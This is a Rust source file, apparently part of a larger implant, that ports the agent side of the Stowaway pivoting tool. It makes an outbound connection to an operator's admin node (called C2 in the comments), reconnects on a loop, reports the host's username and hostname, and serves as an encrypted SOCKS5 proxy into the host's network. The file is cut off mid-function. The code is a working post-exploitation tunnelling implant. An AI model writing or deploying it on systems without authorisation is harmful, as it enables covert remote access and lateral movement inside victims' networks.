//! Stowaway agent protocol — Rust translation of the Go stowaway_agent.
//! Only implements: active connect, pre-auth, HI/UUID handshake, MYINFO, SOCKS5.
//! No Forward, Backward, Shell, SSH, File, Listen, child-node topology.

use std::collections::HashMap;
use std::io::{Read, Write, ErrorKind};
use std::net::{TcpStream, ToSocketAddrs, Shutdown};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

// ── Constants (from protocol/protocol.go) ────────────────────────────────────

const ADMIN_UUID: &str = "IAMADMINXD";
const TEMP_UUID: &str  = "IAMNEWHERE";
const TEMP_ROUTE: &str = "THEREISNOROUTE";

const MSG_HI: u16           = 0;
const MSG_UUID: u16         = 1;
const MSG_MYINFO: u16       = 4;
const MSG_SOCKSSTART: u16   = 26;
const MSG_SOCKSTCPDATA: u16 = 27;
const MSG_SOCKSTCPFIN: u16  = 31;
const MSG_SOCKSREADY: u16   = 32;
const MSG_SHUTDOWN: u16     = 51;
const MSG_HEARTBEAT: u16    = 53;

const RECONNECT_INTERVAL: u64 = 10;
const MAX_FRAME_DATA: usize = 10 * 1024 * 1024; // 10 MB sanity cap

// ── Global state (like ws_pty) ───────────────────────────────────────────────

static TUNNEL_ACTIVE: AtomicBool = AtomicBool::new(false);
static TUNNEL_STOP: AtomicBool   = AtomicBool::new(false);

/// Stored so `request_stop` can shutdown the TCP read half, unblocking `recv_frame`.
static TUNNEL_STREAM: Mutex<Option<TcpStream>> = Mutex::new(None);

pub fn request_stop() {
    TUNNEL_STOP.store(true, Ordering::SeqCst);
    if let Ok(guard) = TUNNEL_STREAM.lock() {
        if let Some(ref s) = *guard {
            let _ = s.shutdown(Shutdown::Both);
        }
    }
}

pub fn is_active() -> bool {
    TUNNEL_ACTIVE.load(Ordering::Relaxed)
}

// ── Entry point ──────────────────────────────────────────────────────────────

pub fn start(addr: &str, secret: &str) -> String {
    if TUNNEL_ACTIVE.swap(true, Ordering::SeqCst) {
        return "tunnel already running".to_string();
    }
    TUNNEL_STOP.store(false, Ordering::SeqCst);

    let addr = addr.to_string();
    let secret = secret.to_string();
    thread::spawn(move || {
        run_tunnel(&addr, &secret);
        // Clear the stored stream on exit
        if let Ok(mut g) = TUNNEL_STREAM.lock() { *g = None; }
        TUNNEL_ACTIVE.store(false, Ordering::Relaxed);
        crate::debug_log("Stowaway tunnel thread exited");
    });

    "tunnel started".to_string()
}

fn run_tunnel(addr: &str, secret: &str) {
    let key = key_padding(secret.as_bytes());

    loop {
        if TUNNEL_STOP.load(Ordering::Relaxed) { return; }

        crate::debug_log(&format!("Stowaway: connecting to {}", addr));

        match connect_and_handshake(addr, secret, &key) {
            Ok((stream, uuid)) => {
                crate::debug_log(&format!("Stowaway: connected, uuid={}", uuid));

                // Store a clone for `request_stop` to shutdown
                if let Ok(mut g) = TUNNEL_STREAM.lock() {
                    *g = stream.try_clone().ok();
                }

                send_my_info(&stream, &uuid, &key);
                message_loop(stream, &uuid, &key);

                // Clear stored stream after loop exits
                if let Ok(mut g) = TUNNEL_STREAM.lock() { *g = None; }

                crate::debug_log("Stowaway: connection lost, will reconnect");
            }
            Err(e) => {
                crate::debug_log(&format!("Stowaway: connect failed: {}", e));
            }
        }

        if TUNNEL_STOP.load(Ordering::Relaxed) { return; }
        thread::sleep(Duration::from_secs(RECONNECT_INTERVAL));
    }
}

// ── Pre-auth (share/preauth.go :: ActivePreAuth) ─────────────────────────────

fn pre_auth(stream: &mut TcpStream, secret: &str) -> Result<(), String> {
    let token = pre_auth_token(secret);

    stream.write_all(token.as_bytes()).map_err(|e| format!("write token: {}", e))?;

    let mut buf = [0u8; 16];
    read_exact(stream, &mut buf).map_err(|e| format!("read token: {}", e))?;

    if &buf == token.as_bytes() {
        Ok(())
    } else {
        Err("invalid secret".to_string())
    }
}

fn pre_auth_token(secret: &str) -> String {
    use md5::{Md5, Digest};
    let mut hasher = Md5::new();
    hasher.update(secret.as_bytes());
    let hex = format!("{:x}", hasher.finalize());
    hex[..16].to_string()
}

// ── Handshake (agent/initial/method.go :: NormalActive) ──────────────────────

fn connect_and_handshake(
    addr: &str,
    secret: &str,
    key: &Option<Vec<u8>>,
) -> Result<(TcpStream, String), String> {
    let mut stream = TcpStream::connect_timeout(
        &addr.to_socket_addrs()
            .map_err(|e| format!("resolve: {}", e))?
            .next()
            .ok_or("no address")?,
        Duration::from_secs(15),
    ).map_err(|e| format!("connect: {}", e))?;

    stream.set_read_timeout(Some(Duration::from_secs(30))).ok();
    stream.set_write_timeout(Some(Duration::from_secs(15))).ok();

    pre_auth(&mut stream, secret)?;

    let hi = HIMess {
        greeting: "Shhh...".to_string(),
        uuid: TEMP_UUID.to_string(),
        is_admin: 0,
        is_reconnect: 0,
    };
    let header = Header {
        sender: TEMP_UUID.to_string(),
        accepter: ADMIN_UUID.to_string(),
        message_type: MSG_HI,
        route: TEMP_ROUTE.to_string(),
    };
    send_frame(&mut stream, &header, &hi.serialize(), key)?;

    let (rh, rdata) = recv_frame(&mut stream, key)?;
    if rh.message_type != MSG_HI {
        return Err(format!("expected HI, got type={}", rh.message_type));
    }
    let admin_hi = HIMess::deserialize(&rdata)?;
    if admin_hi.greeting != "Keep silent" || admin_hi.is_admin != 1 {
        return Err("admin HI invalid".to_string());
    }

    let (uh, udata) = recv_frame(&mut stream, key)?;
    if uh.message_type != MSG_UUID {
        return Err(format!("expected UUID, got type={}", uh.message_type));
    }
    let uuid_mess = UUIDMess::deserialize(&udata)?;

    stream.set_read_timeout(None).ok();

    Ok((stream, uuid_mess.uuid))
}

// ── MYINFO (agent/process/process.go :: sendMyInfo) ──────────────────────────

fn send_my_info(stream: &TcpStream, uuid: &str, key: &Option<Vec<u8>>) {
    let hostname = whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string());
    let username = whoami::username();

    let info = MyInfo {
        uuid: uuid.to_string(),
        username,
        hostname,
        memo: String::new(),
    };
    let header = Header {
        sender: uuid.to_string(),
        accepter: ADMIN_UUID.to_string(),
        message_type: MSG_MYINFO,
        route: TEMP_ROUTE.to_string(),
    };
    if let Ok(mut s) = stream.try_clone() {
        let _ = send_frame(&mut s, &header, &info.serialize(), key);
    }
}

// ── Message loop (agent/process/process.go :: handleDataFromUpstream) ────────
//
// FIX: Split TcpStream into dedicated reader + shared writer.
// Go's net.Conn supports concurrent read/write natively; Rust TcpStream needs
// separate handles via try_clone(). Without this split, a single Mutex would
// serialize all I/O — the message-loop read blocks every SOCKS write and vice
// versa, destroying throughput and causing potential deadlocks.

fn message_loop(stream: TcpStream, uuid: &str, key: &Option<Vec<u8>>) {
    // Writer: shared across all SOCKS sessions for sending frames back to admin
    let writer: Arc<Mutex<TcpStream>> = Arc::new(Mutex::new(stream));

    // Reader: exclusive to this loop — never contends with writers
    let mut reader = match lock_or_recover(&writer).try_clone() {
        Ok(s) => s,
        Err(_) => return,
    };
    // NO read timeout: Linux SO_RCVTIMEO surfaces as EAGAIN whose Display
    // string matched neither "timed out" nor "WouldBlock", so the old string
    // matching treated idle timeouts as fatal and tore the tunnel down every
    // 30 s. Worse, a timeout mid-frame loses the partial bytes already read
    // (read_exact) and desyncs the protocol. request_stop() unblocks this
    // read via TUNNEL_STREAM shutdown, so no timeout is needed.

    let sessions: Arc<Mutex<HashMap<u64, SocksSession>>> =
        Arc::new(Mutex::new(HashMap::new()));
    let socks_username: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    let socks_password: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));

    loop {
        if TUNNEL_STOP.load(Ordering::Relaxed) { return; }

        let (header, data) = match recv_frame(&mut reader, key) {
            Ok(r) => r,
            Err(e) => {
                // Genuine I/O failure (connection closed / shutdown) — exit and
                // let run_tunnel reconnect. Idle reads no longer time out.
                crate::debug_log(&format!("Stowaway: recv error: {}", e));
                return;
            }
        };

        if header.accepter != uuid {
            continue;
        }

        match header.message_type {
            MSG_HEARTBEAT => {}
            MSG_SHUTDOWN => {
                crate::debug_log("Stowaway: received SHUTDOWN");
                TUNNEL_STOP.store(true, Ordering::Relaxed);
                return;
            }
            MSG_SOCKSSTART => {
                let ss = SocksStart::deserialize(&data);
                if let Ok(ss) = ss {
                    // N5：统一走 lock_or_recover——任一线程持锁 panic 后，
                    // unwrap 会级联 panic 使隧道永久失效。
                    *lock_or_recover(&socks_username) = ss.username;
                    *lock_or_recover(&socks_password) = ss.password;
                }
                let ready = {
                    let map = lock_or_recover(&sessions);
                    map.is_empty()
                };
                let ok_val: u16 = if ready { 1 } else { 0 };
                let reply = SocksReady { ok: ok_val };
                let rh = Header {
                    sender: uuid.to_string(),
                    accepter: ADMIN_UUID.to_string(),
                    message_type: MSG_SOCKSREADY,
                    route: TEMP_ROUTE.to_string(),
                };
                let mut w = lock_or_recover(&writer);
                let _ = send_frame(&mut *w, &rh, &reply.serialize(), key);
            }
            MSG_SOCKSTCPDATA => {
                if data.len() < 16 { continue; }
                let seq = u64::from_be_bytes(data[0..8].try_into().unwrap());
                let data_len = u64::from_be_bytes(data[8..16].try_into().unwrap()) as usize;
                // 审计修复（N1）：旧代码 `data.len() >= 16 + data_len` 在
                // data_len=u64::MAX 时加法回绕成 15，检查通过后 data[16..15]
                // 直接 panic。改用 checked_add 判界；长度字段超界/回绕时
                // 退回取帧内剩余字节（与旧语义一致）。
                let payload = match checked_slice(&data, 16, data_len) {
                    Some(s) => s.to_vec(),
                    None => data[16..].to_vec(),
                };

                let is_new = {
                    let mut map = lock_or_recover(&sessions);
                    if !map.contains_key(&seq) {
                        let (tx, rx) = std::sync::mpsc::channel::<Vec<u8>>();
                        map.insert(seq, SocksSession { tx });
                        Some(rx)
                    } else {
                        None
                    }
                };

                {
                    let map = lock_or_recover(&sessions);
                    if let Some(session) = map.get(&seq) {
                        let _ = session.tx.send(payload.clone());
                    }
                }

                if let Some(rx) = is_new {
                    let writer_c = Arc::clone(&writer);
                    let sessions_c = Arc::clone(&sessions);
                    let key_c = key.clone();
                    let uuid_c = uuid.to_string();
                    let uname = lock_or_recover(&socks_username).clone();
                    let passwd = lock_or_recover(&socks_password).clone();
                    thread::spawn(move || {
                        handle_socks_session(
                            seq, rx, &writer_c, &sessions_c,
                            &uuid_c, &key_c, &uname, &passwd,
                        );
                    });
                }
            }
            MSG_SOCKSTCPFIN => {
                if data.len() >= 8 {
                    let seq = u64::from_be_bytes(data[0..8].try_into().unwrap());
                    let mut map = lock_or_recover(&sessions);
                    map.remove(&seq); // drops Sender → Receiver returns Err → session exits
                }
            }
            _ => {}
        }
    }
}

/// Poison-safe lock: recover the inner data if a thread panicked while holding it.
fn lock_or_recover<T>(m: &Mutex<T>) -> std::sync::MutexGuard<'_, T> {
    m.lock().unwrap_or_else(|e| e.into_inner())
}

/// 审计修复（N1）：按 `start.checked_add(len)` 判界切片——协议里的 u64
/// 长度字段可能取 usize::MAX，`start + len` 直接相加会回绕成小数、绕过
/// 长度检查后在切片处 panic。溢出或越界返回 None，由调用方降级。
fn checked_slice(data: &[u8], start: usize, len: usize) -> Option<&[u8]> {
    let end = start.checked_add(len)?;
    if end <= data.len() { Some(&data[start..end]) } else { None }
}

// ── SOCKS session ────────────────────────────────────────────────────────────

struct SocksSession {
    tx: std::sync::mpsc::Sender<Vec<u8>>,
}

fn handle_socks_session(
    seq: u64,
    rx: std::sync::mpsc::Receiver<Vec<u8>>,
    writer: &Arc<Mutex<TcpStream>>,
    sessions: &Arc<Mutex<HashMap<u64, SocksSession>>>,
    uuid: &str,
    key: &Option<Vec<u8>>,
    socks_username: &str,
    socks_password: &str,
) {
    let _guard = SocksFinGuard {
        seq,
        writer: Arc::clone(writer),
        uuid: uuid.to_string(),
        key: key.clone(),
        sessions: Arc::clone(sessions),
    };

    // Phase 1: Method negotiation
    let data = match rx.recv() {
        Ok(d) => d,
        Err(_) => return,
    };
    let method = check_method(seq, &data, writer, uuid, key, socks_username, socks_password);
    if method == "ILLEGAL" {
        return;
    }

    // Phase 2: Password auth (if needed)
    if method == "PASSWORD" {
        let data = match rx.recv() {
            Ok(d) => d,
            Err(_) => return,
        };
        if !auth_password(seq, &data, writer, uuid, key, socks_username, socks_password) {
            return;
        }
    }

    // Phase 3: CONNECT
    let data = match rx.recv() {
        Ok(d) => d,
        Err(_) => return,
    };
    let target_conn = match tcp_connect(seq, &data, writer, uuid, key) {
        Some(c) => c,
        None => return,
    };

    // Phase 4: Bidirectional relay
    let conn_for_c2s = match target_conn.try_clone() {
        Ok(c) => c,
        Err(_) => return,
    };

    // C2 → target: channel receiver is moved into thread directly (no Arc<Mutex> needed)
    let t1 = thread::spawn(move || {
        relay_c2s(conn_for_c2s, rx);
    });

    // target → C2: read from target, send frames to admin
    relay_s2c(target_conn, seq, writer, uuid, key);

    // Target side closed (or the tunnel died). Drop the guard FIRST: its Drop
    // removes the session entry (dropping the channel Sender, which unblocks
    // relay_c2s's rx.recv() so t1 can exit) and sends SOCKSTCPFIN to the admin.
    // The old code joined t1 before any of this — t1 blocks forever on a live
    // Sender, so the join hung, the FIN was never sent, and the thread, socket
    // and session entry all leaked on every "target closed first" session.
    drop(_guard);
    let _ = t1.join();
}

struct SocksFinGuard {
    seq: u64,
    writer: Arc<Mutex<TcpStream>>,
    uuid: String,
    key: Option<Vec<u8>>,
    sessions: Arc<Mutex<HashMap<u64, SocksSession>>>,
}

impl Drop for SocksFinGuard {
    fn drop(&mut self) {
        // Only send FIN if the session is still in the map (avoids double-FIN
        // when admin already sent SOCKSTCPFIN which removed the entry).
        let still_present = {
            let mut map = lock_or_recover(&self.sessions);
            map.remove(&self.seq).is_some()
        };

        if still_present {
            let fin = SocksTCPFin { seq: self.seq };
            let header = Header {
                sender: self.uuid.clone(),
                accepter: ADMIN_UUID.to_string(),
                message_type: MSG_SOCKSTCPFIN,
                route: TEMP_ROUTE.to_string(),
            };
            if let Ok(mut w) = self.writer.lock() {
                let _ = send_frame(&mut *w, &header, &fin.serialize(), &self.key);
            }
        }
    }
}

// ── SOCKS5 helpers (agent/handler/socks.go) ──────────────────────────────────

fn check_method(
    seq: u64,
    data: &[u8],
    writer: &Arc<Mutex<TcpStream>>,
    uuid: &str,
    key: &Option<Vec<u8>>,
    socks_username: &str,
    socks_password: &str,
) -> String {
    let header = Header {
        sender: uuid.to_string(),
        accepter: ADMIN_UUID.to_string(),
        message_type: MSG_SOCKSTCPDATA,
        route: TEMP_ROUTE.to_string(),
    };

    if data.len() < 2 || data[0] != 0x05 {
        return "ILLEGAL".to_string();
    }

    let n_methods = data[1] as usize;
    if data.len() < 2 + n_methods {
        return "ILLEGAL".to_string();
    }

    let methods = &data[2..2 + n_methods];
    let no_auth = methods.contains(&0x00);
    let user_pass = methods.contains(&0x02);

    if !no_auth && !user_pass {
        let reply = make_socks_tcp_data(seq, &[0x05, 0xff]);
        if let Ok(mut w) = writer.lock() { let _ = send_frame(&mut *w, &header, &reply, key); }
        return "ILLEGAL".to_string();
    }

    if no_auth && socks_username.is_empty() && socks_password.is_empty() {
        let reply = make_socks_tcp_data(seq, &[0x05, 0x00]);
        if let Ok(mut w) = writer.lock() { let _ = send_frame(&mut *w, &header, &reply, key); }
        return "NONE".to_string();
    }

    if user_pass && !socks_username.is_empty() && !socks_password.is_empty() {
        let reply = make_socks_tcp_data(seq, &[0x05, 0x02]);
        if let Ok(mut w) = writer.lock() { let _ = send_frame(&mut *w, &header, &reply, key); }
        return "PASSWORD".to_string();
    }

    // Credentials are configured but the client offered no (or only no-auth)
    // method → reject. The old bare `if no_auth` fallback accepted EVERY
    // unauthenticated client even when s5admin/123456 was configured.
    let reply = make_socks_tcp_data(seq, &[0x05, 0xff]);
    if let Ok(mut w) = writer.lock() { let _ = send_frame(&mut *w, &header, &reply, key); }
    "ILLEGAL".to_string()
}

fn auth_password(
    seq: u64,
    data: &[u8],
    writer: &Arc<Mutex<TcpStream>>,
    uuid: &str,
    key: &Option<Vec<u8>>,
    socks_username: &str,
    socks_password: &str,
) -> bool {
    let header = Header {
        sender: uuid.to_string(),
        accepter: ADMIN_UUID.to_string(),
        message_type: MSG_SOCKSTCPDATA,
        route: TEMP_ROUTE.to_string(),
    };

    if data.len() < 2 { return false; }
    let ulen = data[1] as usize;
    if data.len() < 2 + ulen + 1 { return false; }
    let plen = data[2 + ulen] as usize;
    if data.len() < 3 + ulen + plen { return false; }

    let client_user = std::str::from_utf8(&data[2..2 + ulen]).unwrap_or("");
    let client_pass = std::str::from_utf8(&data[3 + ulen..3 + ulen + plen]).unwrap_or("");

    let ok = client_user == socks_username && client_pass == socks_password;
    let reply = if ok {
        make_socks_tcp_data(seq, &[0x01, 0x00])
    } else {
        make_socks_tcp_data(seq, &[0x01, 0x01])
    };
    if let Ok(mut w) = writer.lock() { let _ = send_frame(&mut *w, &header, &reply, key); }
    ok
}

fn tcp_connect(
    seq: u64,
    data: &[u8],
    writer: &Arc<Mutex<TcpStream>>,
    uuid: &str,
    key: &Option<Vec<u8>>,
) -> Option<TcpStream> {
    let header = Header {
        sender: uuid.to_string(),
        accepter: ADMIN_UUID.to_string(),
        message_type: MSG_SOCKSTCPDATA,
        route: TEMP_ROUTE.to_string(),
    };

    let fail_data: &[u8] = &[0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
    let succ_data: &[u8] = &[0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];

    let send_fail = |w: &Arc<Mutex<TcpStream>>| {
        let reply = make_socks_tcp_data(seq, fail_data);
        if let Ok(mut w) = w.lock() { let _ = send_frame(&mut *w, &header, &reply, key); }
    };

    let length = data.len();
    if length <= 4 || data[0] != 0x05 || data[1] != 0x01 {
        send_fail(writer);
        return None;
    }

    let host = match data[3] {
        0x01 => {
            if length < 10 { send_fail(writer); return None; }
            format!("{}.{}.{}.{}", data[4], data[5], data[6], data[7])
        }
        0x03 => {
            if length < 5 { send_fail(writer); return None; }
            let dlen = data[4] as usize;
            if length < 5 + dlen + 2 { send_fail(writer); return None; }
            String::from_utf8_lossy(&data[5..5 + dlen]).to_string()
        }
        0x04 => {
            if length < 22 { send_fail(writer); return None; }
            let ip = std::net::Ipv6Addr::new(
                u16::from_be_bytes([data[4], data[5]]),
                u16::from_be_bytes([data[6], data[7]]),
                u16::from_be_bytes([data[8], data[9]]),
                u16::from_be_bytes([data[10], data[11]]),
                u16::from_be_bytes([data[12], data[13]]),
                u16::from_be_bytes([data[14], data[15]]),
                u16::from_be_bytes([data[16], data[17]]),
                u16::from_be_bytes([data[18], data[19]]),
            );
            format!("{}", ip)
        }
        _ => {
            send_fail(writer);
            return None;
        }
    };

    let port = (data[length - 2] as u16) << 8 | data[length - 1] as u16;
    let target_addr = format!("{}:{}", host, port);

    let resolved = match target_addr.to_socket_addrs() {
        Ok(mut a) => match a.next() { Some(a) => a, None => { send_fail(writer); return None; } },
        Err(_) => { send_fail(writer); return None; }
    };

    let conn = match TcpStream::connect_timeout(&resolved, Duration::from_secs(10)) {
        Ok(c) => c,
        Err(_) => { send_fail(writer); return None; }
    };

    let reply = make_socks_tcp_data(seq, succ_data);
    if let Ok(mut w) = writer.lock() { let _ = send_frame(&mut *w, &header, &reply, key); }

    Some(conn)
}

/// C2 → target: read from mpsc channel, write to target TCP socket.
/// Receiver is single-consumer, moved directly — no Arc<Mutex> wrapper needed.
fn relay_c2s(mut conn: TcpStream, rx: std::sync::mpsc::Receiver<Vec<u8>>) {
    loop {
        match rx.recv() {
            Ok(data) => {
                if conn.write_all(&data).is_err() { return; }
            }
            Err(_) => {
                let _ = conn.shutdown(Shutdown::Both);
                return;
            }
        }
    }
}

/// target → C2: read from target TCP socket, send frames to admin via writer.
fn relay_s2c(
    mut conn: TcpStream,
    seq: u64,
    writer: &Arc<Mutex<TcpStream>>,
    uuid: &str,
    key: &Option<Vec<u8>>,
) {
    let header = Header {
        sender: uuid.to_string(),
        accepter: ADMIN_UUID.to_string(),
        message_type: MSG_SOCKSTCPDATA,
        route: TEMP_ROUTE.to_string(),
    };

    let mut buf = [0u8; 20480];
    loop {
        match conn.read(&mut buf) {
            Ok(0) => {
                let _ = conn.shutdown(Shutdown::Both);
                return;
            }
            Ok(n) => {
                let reply = make_socks_tcp_data(seq, &buf[..n]);
                if let Ok(mut w) = writer.lock() {
                    if send_frame(&mut *w, &header, &reply, key).is_err() {
                        return;
                    }
                }
            }
            Err(ref e) if e.kind() == ErrorKind::Interrupted => continue,
            Err(_) => {
                let _ = conn.shutdown(Shutdown::Both);
                return;
            }
        }
    }
}

// ── Protocol frame encode/decode (protocol/raw.go) ───────────────────────────

struct Header {
    sender: String,
    accepter: String,
    message_type: u16,
    route: String,
}

fn send_frame(
    stream: &mut TcpStream,
    header: &Header,
    payload: &[u8],
    key: &Option<Vec<u8>>,
) -> Result<(), String> {
    let mut data = gzip_compress(payload);
    data = aes_encrypt(&data, key);

    let mut buf = Vec::with_capacity(34 + header.route.len() + data.len());
    buf.extend_from_slice(&pad_or_trunc(header.sender.as_bytes(), 10));
    buf.extend_from_slice(&pad_or_trunc(header.accepter.as_bytes(), 10));
    buf.extend_from_slice(&header.message_type.to_be_bytes());
    buf.extend_from_slice(&(header.route.len() as u32).to_be_bytes());
    buf.extend_from_slice(header.route.as_bytes());
    buf.extend_from_slice(&(data.len() as u64).to_be_bytes());
    buf.extend_from_slice(&data);

    stream.write_all(&buf).map_err(|e| format!("send: {}", e))
}

fn recv_frame(
    stream: &mut TcpStream,
    key: &Option<Vec<u8>>,
) -> Result<(Header, Vec<u8>), String> {
    let mut sender_buf = [0u8; 10];
    read_exact(stream, &mut sender_buf).map_err(|e| format!("recv sender: {}", e))?;

    let mut accepter_buf = [0u8; 10];
    read_exact(stream, &mut accepter_buf).map_err(|e| format!("recv accepter: {}", e))?;

    let mut mt_buf = [0u8; 2];
    read_exact(stream, &mut mt_buf).map_err(|e| format!("recv msg_type: {}", e))?;

    let mut rl_buf = [0u8; 4];
    read_exact(stream, &mut rl_buf).map_err(|e| format!("recv route_len: {}", e))?;
    let route_len = u32::from_be_bytes(rl_buf) as usize;

    if route_len > MAX_FRAME_DATA {
        return Err("route_len exceeds limit".to_string());
    }

    let mut route_buf = vec![0u8; route_len];
    if route_len > 0 {
        read_exact(stream, &mut route_buf).map_err(|e| format!("recv route: {}", e))?;
    }

    let mut dl_buf = [0u8; 8];
    read_exact(stream, &mut dl_buf).map_err(|e| format!("recv data_len: {}", e))?;
    let data_len = u64::from_be_bytes(dl_buf) as usize;

    if data_len > MAX_FRAME_DATA {
        return Err("data_len exceeds limit".to_string());
    }

    let mut data_buf = vec![0u8; data_len];
    if data_len > 0 {
        read_exact(stream, &mut data_buf).map_err(|e| format!("recv data: {}", e))?;
    }

    let header = Header {
        sender: String::from_utf8_lossy(&sender_buf).to_string(),
        accepter: String::from_utf8_lossy(&accepter_buf).to_string(),
        message_type: u16::from_be_bytes(mt_buf),
        route: String::from_utf8_lossy(&route_buf).to_string(),
    };

    let decrypted = aes_decrypt(&data_buf, key);
    let decompressed = gzip_decompress(&decrypted);

    Ok((header, decompressed))
}

fn read_exact(stream: &mut TcpStream, buf: &mut [u8]) -> std::io::Result<()> {
    let mut pos = 0;
    while pos < buf.len() {
        match stream.read(&mut buf[pos..]) {
            Ok(0) => return Err(std::io::Error::new(ErrorKind::UnexpectedEof, "eof")),
            Ok(n) => pos += n,
            Err(ref e) if e.kind() == ErrorKind::Interrupted => continue,
            Err(e) => return Err(e),
        }
    }
    Ok(())
}

fn pad_or_trunc(src: &[u8], len: usize) -> Vec<u8> {
    let mut buf = vec![0u8; len];
    let copy_len = src.len().min(len);
    buf[..copy_len].copy_from_slice(&src[..copy_len]);
    buf
}

// ── AES-256-GCM (crypto/aes.go) ─────────────────────────────────────────────

fn key_padding(secret: &[u8]) -> Option<Vec<u8>> {
    if secret.is_empty() {
        return None;
    }
    let mut key = secret.to_vec();
    if key.len() > 32 {
        key.truncate(32);
    } else {
        key.resize(32, 0);
    }
    Some(key)
}

fn aes_encrypt(data: &[u8], key: &Option<Vec<u8>>) -> Vec<u8> {
    let key_bytes = match key {
        Some(k) => k,
        None => return data.to_vec(),
    };
    use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
    use aes_gcm::aead::generic_array::GenericArray;

    let cipher = Aes256Gcm::new(GenericArray::from_slice(key_bytes));
    let mut nonce_bytes = [0u8; 12];
    use rand::RngCore;
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = GenericArray::from_slice(&nonce_bytes);

    match cipher.encrypt(nonce, data) {
        Ok(ciphertext) => {
            let mut result = nonce_bytes.to_vec();
            result.extend_from_slice(&ciphertext);
            result
        }
        Err(_) => data.to_vec(),
    }
}

fn aes_decrypt(data: &[u8], key: &Option<Vec<u8>>) -> Vec<u8> {
    let key_bytes = match key {
        Some(k) => k,
        None => return data.to_vec(),
    };
    if data.len() < 12 {
        return data.to_vec();
    }
    use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
    use aes_gcm::aead::generic_array::GenericArray;

    let cipher = Aes256Gcm::new(GenericArray::from_slice(key_bytes));
    let nonce = GenericArray::from_slice(&data[..12]);
    let ciphertext = &data[12..];

    match cipher.decrypt(nonce, ciphertext) {
        Ok(plaintext) => plaintext,
        Err(_) => data.to_vec(),
    }
}

// ── Gzip (crypto/gzip.go) ───────────────────────────────────────────────────

fn gzip_compress(data: &[u8]) -> Vec<u8> {
    use flate2::write::GzEncoder;
    use flate2::Compression;

    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    if encoder.write_all(data).is_err() {
        return data.to_vec();
    }
    encoder.finish().unwrap_or_else(|_| data.to_vec())
}

fn gzip_decompress(data: &[u8]) -> Vec<u8> {
    use flate2::read::GzDecoder;

    let mut decoder = GzDecoder::new(data);
    let mut buf = Vec::new();
    match decoder.read_to_end(&mut buf) {
        Ok(_) => buf,
        Err(_) => data.to_vec(),
    }
}

// ── Message structs + serialization (protocol/protocol.go) ───────────────────

struct HIMess {
    greeting: String,
    uuid: String,
    is_admin: u16,
    is_reconnect: u16,
}

impl HIMess {
    fn serialize(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.extend_from_slice(&(self.greeting.len() as u16).to_be_bytes());
        buf.extend_from_slice(self.greeting.as_bytes());
        buf.extend_from_slice(&(self.uuid.len() as u16).to_be_bytes());
        buf.extend_from_slice(self.uuid.as_bytes());
        buf.extend_from_slice(&self.is_admin.to_be_bytes());
        buf.extend_from_slice(&self.is_reconnect.to_be_bytes());
        buf
    }

    fn deserialize(data: &[u8]) -> Result<Self, String> {
        let mut p = 0usize;
        if data.len() < 2 { return Err("HI too short".into()); }
        let gl = u16::from_be_bytes(data[p..p+2].try_into().unwrap()) as usize; p += 2;
        if data.len() < p + gl { return Err("HI greeting".into()); }
        let greeting = String::from_utf8_lossy(&data[p..p+gl]).to_string(); p += gl;
        if data.len() < p + 2 { return Err("HI uuid len".into()); }
        let ul = u16::from_be_bytes(data[p..p+2].try_into().unwrap()) as usize; p += 2;
        if data.len() < p + ul { return Err("HI uuid".into()); }
        let uuid = String::from_utf8_lossy(&data[p..p+ul]).to_string(); p += ul;
        if data.len() < p + 4 { return Err("HI flags".into()); }
        let is_admin = u16::from_be_bytes(data[p..p+2].try_into().unwrap()); p += 2;
        let is_reconnect = u16::from_be_bytes(data[p..p+2].try_into().unwrap());
        Ok(HIMess { greeting, uuid, is_admin, is_reconnect })
    }
}

struct UUIDMess {
    uuid: String,
}

impl UUIDMess {
    fn deserialize(data: &[u8]) -> Result<Self, String> {
        if data.len() < 2 { return Err("UUID too short".into()); }
        let ul = u16::from_be_bytes(data[0..2].try_into().unwrap()) as usize;
        if data.len() < 2 + ul { return Err("UUID data".into()); }
        let uuid = String::from_utf8_lossy(&data[2..2+ul]).to_string();
        Ok(UUIDMess { uuid })
    }
}

struct MyInfo {
    uuid: String,
    username: String,
    hostname: String,
    memo: String,
}

impl MyInfo {
    fn serialize(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.extend_from_slice(&(self.uuid.len() as u16).to_be_bytes());
        buf.extend_from_slice(self.uuid.as_bytes());
        buf.extend_from_slice(&(self.username.len() as u64).to_be_bytes());
        buf.extend_from_slice(self.username.as_bytes());
        buf.extend_from_slice(&(self.hostname.len() as u64).to_be_bytes());
        buf.extend_from_slice(self.hostname.as_bytes());
        buf.extend_from_slice(&(self.memo.len() as u64).to_be_bytes());
        buf.extend_from_slice(self.memo.as_bytes());
        buf
    }
}

struct SocksStart {
    username: String,
    password: String,
}

impl SocksStart {
    fn deserialize(data: &[u8]) -> Result<Self, String> {
        // 审计修复（N1）：u64 长度字段用 checked_slice 判界，防止
        // `p + ul` 回绕后 data[8..7] panic。
        let mut p = 0usize;
        if data.len() < 8 { return Err("SocksStart too short".into()); }
        let ul = u64::from_be_bytes(data[p..p+8].try_into().unwrap()) as usize; p += 8;
        let username = String::from_utf8_lossy(
            checked_slice(data, p, ul).ok_or("SocksStart username")?).to_string();
        p += ul;
        if data.len() < p + 8 { return Err("SocksStart password len".into()); }
        let pl = u64::from_be_bytes(data[p..p+8].try_into().unwrap()) as usize; p += 8;
        let password = String::from_utf8_lossy(
            checked_slice(data, p, pl).ok_or("SocksStart password")?).to_string();
        Ok(SocksStart { username, password })
    }
}

struct SocksReady {
    ok: u16,
}

impl SocksReady {
    fn serialize(&self) -> Vec<u8> {
        self.ok.to_be_bytes().to_vec()
    }
}

struct SocksTCPFin {
    seq: u64,
}

impl SocksTCPFin {
    fn serialize(&self) -> Vec<u8> {
        self.seq.to_be_bytes().to_vec()
    }
}

fn make_socks_tcp_data(seq: u64, payload: &[u8]) -> Vec<u8> {
    let mut buf = Vec::with_capacity(16 + payload.len());
